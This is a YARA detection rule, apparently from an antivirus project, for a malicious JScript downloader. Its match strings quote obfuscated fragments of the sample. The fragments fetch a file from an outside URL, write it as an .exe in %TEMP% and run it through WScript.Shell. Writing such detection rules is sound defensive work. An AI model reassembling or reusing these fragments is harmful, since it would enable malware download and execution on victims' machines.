rule sig_20160329_d21ca56bcc4d01aaf3b4abb676b0a4ba {
  meta:
    description = "datamaliciousorder - file 20160329_d21ca56bcc4d01aaf3b4abb676b0a4ba.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1b23ff5c6f43a1b845195e4cefa0767047059567fbf643aa1dfe777feec1bde0"

  strings:
    $s1  = "Woqvfu[Pqyyixrijf](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s2  = "function Mqyfvf() {return Gkvivxwzu[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"qEFrhCAuXaVA25o2.exe\";};" fullword ascii
    $s3  = "do {WScript[Kpdoeot](Skciothmi() * 11)} while (Woqvfu[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Pmmfeh(Ctwhemxw, Ltpghan){return Ctwhemxw - Ltpghan;};" fullword ascii
    $s5  = "var Gkvivxwzu = function Uetfq() {return WScript[Xkootijd](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Zgmdyog(Maclwwm){Gkvivxwzu[\"Run\"](Maclwwm, Wjmttodzh, Wjmttodzh);};" fullword ascii
    $s7  = "function Fpezlg() {return ((Pfhmkowa == true) && (Pfhmkowa == Qfimgekxup)) ? 1 : Wjmttodzh;};" fullword ascii
    $s8  = " while (Inizkcoho){" fullword ascii
    $s9  = "function Vrmngacq(Kurfabkbpi) {var Lxkle = (1, 2, 3, 4, 5, Kurfabkbpi); return Lxkle;};" fullword ascii
    $s10 = "function Skciothmi(){return 22;};" fullword ascii
    $s11 = "function Dlxqdiixt(){return Xkootijd;};" fullword ascii
    $s12 = "var Pfhmkowa = false;" fullword ascii
    $s13 = "Qfimgekxup = true; " fullword ascii
    $s14 = "var Bcpspejjv = false;" fullword ascii
    $s15 = "var Azocfm = new this[\"Date\"]();" fullword ascii
    $s16 = "function Nrvovqsn(){return Qyqairpraw;};" fullword ascii
    $s17 = "function Zifljwg()" fullword ascii
    $s18 = "Pfhmkowa = true; " fullword ascii
    $s19 = "return Pmmfeh(Grjqojkoeg, Cepuq);" fullword ascii
    $s20 = "var Qfimgekxup = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}